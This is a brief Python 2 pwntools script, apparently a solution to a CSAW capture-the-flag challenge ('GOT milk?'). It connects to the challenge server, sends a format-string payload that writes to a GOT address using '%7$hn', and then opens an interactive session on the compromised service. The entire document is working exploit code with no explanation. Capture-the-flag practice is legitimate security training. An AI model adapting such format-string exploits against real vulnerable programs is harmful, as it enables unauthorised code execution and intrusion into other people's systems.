from pwn import *
io=remote("pwn.chal.csaw.io",1004)
payload=p32(0x804a010)+"%16904x"+"%7$hn"
io.sendlineafter("Hey you! GOT milk? ",payload)
print io.recv()
io.interactive()
